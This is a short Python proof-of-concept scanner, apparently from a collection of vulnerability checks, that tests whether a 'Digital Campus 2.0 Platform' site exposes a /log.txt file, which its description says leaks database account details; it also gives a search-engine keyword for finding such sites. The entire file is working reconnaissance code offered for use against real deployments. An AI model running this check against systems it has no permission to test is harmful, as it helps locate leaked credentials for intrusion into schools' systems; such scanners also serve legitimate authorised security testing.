#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: Digital-Campus数字校园平台LOG文件泄露
referer: http://www.wooyun.org/bugs/wooyun-2014-071575
author: Lucifer
description: 关键词：intitle:数字校园平台--Digital Campus2.0 Platform。log.txt日志文件泄露，可获取数据库账号等敏感信息。
'''
import re
import sys
import requests
import warnings
from termcolor import cprint

class digital_campus_log_disclosure_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/log.txt"
        pattern = re.compile(r'\d{4}-\d{2}-\d{2}\s+\d{2}:\d{2}:\d{2}')
        vulnurl = self.url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            result = pattern.findall(req.text)
            if len(result) != 0:
                cprint("[+]存在Digital Campus2.0 Platform日志文件泄露...(中危)\tpayload: "+vulnurl, "yellow")

        except:
            cprint("[-] "+__file__+"====>连接超时", "cyan")

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = digital_campus_log_disclosure_BaseVerify(sys.argv[1])
    testVuln.run()
